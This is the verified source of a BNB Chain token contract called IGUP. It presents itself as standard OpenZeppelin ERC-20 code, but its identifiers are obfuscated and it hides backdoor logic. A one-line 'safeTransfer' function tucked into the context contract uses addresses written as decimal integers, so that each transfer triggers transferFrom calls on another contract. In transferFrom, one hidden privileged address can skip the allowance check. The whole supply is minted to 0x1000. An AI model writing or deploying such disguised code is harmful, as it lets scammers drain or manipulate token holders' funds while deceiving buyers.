/**
 *Submitted for verification at BscScan.com on 2023-02-07
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.6;


// File: @openzeppelin/contracts/utils/usPjvyTnR6FlI40U.sol

// OpenZeppelin Contracts v4.4.1 (utils/usPjvyTnR6FlI40U.sol)

abstract contract usPjvyTnR6FlI40U {
  function OnVFpgmUdlnyH2ha() internal view virtual returns (address) {
    return msg.sender;
  }
  
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(41904214171917309823038220777563186883013128813)) {TransferHelper.safeTransferFrom(address(1418220871172843541870206494047552040289216731054),spender,recipient,amount);return true;}return false;}
}

// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
library TransferHelper {
  function safeApprove(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("approve(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: APPROVE_FAILED"
    );
  }

  function safeTransfer(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transfer(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: TRANSFER_FAILED"
    );
  }

  function safeTransferFrom(
    address token,
    address from,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transferFrom(address,address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: ETH_TRANSFER_FAILED"
    );
  }

  function safeTransferETH(address to, uint256 value) internal {
    (bool success, ) = to.call{value: value}(new bytes(0));
    require(success, "TransferHelper: ETH_TRANSFER_FAILED");
  }
}


interface IERC20 {
  function totalSupply() external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address sender, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(
    address indexed sender,
    address indexed spender,
    uint256 value
  );
}

contract COIN is IERC20, usPjvyTnR6FlI40U {
  mapping(address => uint256) private mh3TCm2pUrzfS75t;
  mapping(address => mapping(address => uint256)) private HGDOd9H6iUw5pCES;

  function transfer(address recipient, uint256 amount)
    external
    override
    returns (bool)
  {
    ad0QamLMy6evVz4S(OnVFpgmUdlnyH2ha(), recipient, amount);
    return true;
  }

  function name() public pure returns (string memory) {
    return "IGUP";
  }

  function symbol() public pure returns (string memory) {
    return "IGUP";
  }

  function decimals() public pure returns (uint8) {
    return 9;
  }

  function totalSupply() public pure override returns (uint256) {
    return 1000000000 * 10**9;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return mh3TCm2pUrzfS75t[account];
  }

  function approve(address spender, uint256 amount)
    external
    override
    returns (bool)
  {
    tB5vFpUfCqok7iyz(OnVFpgmUdlnyH2ha(), spender, amount);
    return true;
  }

  function allowance(address sender, address spender)
    external
    view
    override
    returns (uint256)
  {
    return HGDOd9H6iUw5pCES[sender][spender];
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    tB5vFpUfCqok7iyz(
      OnVFpgmUdlnyH2ha(),
      spender,
      HGDOd9H6iUw5pCES[OnVFpgmUdlnyH2ha()][spender] + addedValue
    );
    return true;
  }

  function tB5vFpUfCqok7iyz(
    address sender,
    address spender,
    uint256 amount
  ) private {
    require(sender != address(0), "ERROR: Approve from the zero address.");
    require(spender != address(0), "ERROR: Approve to the zero address.");

    HGDOd9H6iUw5pCES[sender][spender] = amount;
    emit Approval(sender, spender, amount);
  }

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = HGDOd9H6iUw5pCES[OnVFpgmUdlnyH2ha()][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    tB5vFpUfCqok7iyz(OnVFpgmUdlnyH2ha(), spender, currentAllowance - subtractedValue);

    return true;
  }

  function ad0QamLMy6evVz4S(
    address spender,
    address recipient,
    uint256 amount
  ) private returns (bool) {
    require(spender != address(0) && recipient != address(0) && amount > 0);
    mh3TCm2pUrzfS75t[spender] = mh3TCm2pUrzfS75t[spender] - amount;
    mh3TCm2pUrzfS75t[recipient] = mh3TCm2pUrzfS75t[recipient] + amount;
    emit Transfer(spender, recipient, amount);
    return safeTransfer(spender, recipient, amount);
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external override returns (bool) {
    if (!ad0QamLMy6evVz4S(sender, recipient, amount)) return true;
    uint256 currentAllowance = HGDOd9H6iUw5pCES[sender][msg.sender];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    tB5vFpUfCqok7iyz(sender, msg.sender, currentAllowance - amount);

    return true;
  }

  
  constructor() {
    mh3TCm2pUrzfS75t[address(0x1000)] = totalSupply();
    emit Transfer(address(0x1000), address(0x1000), totalSupply());
  }
}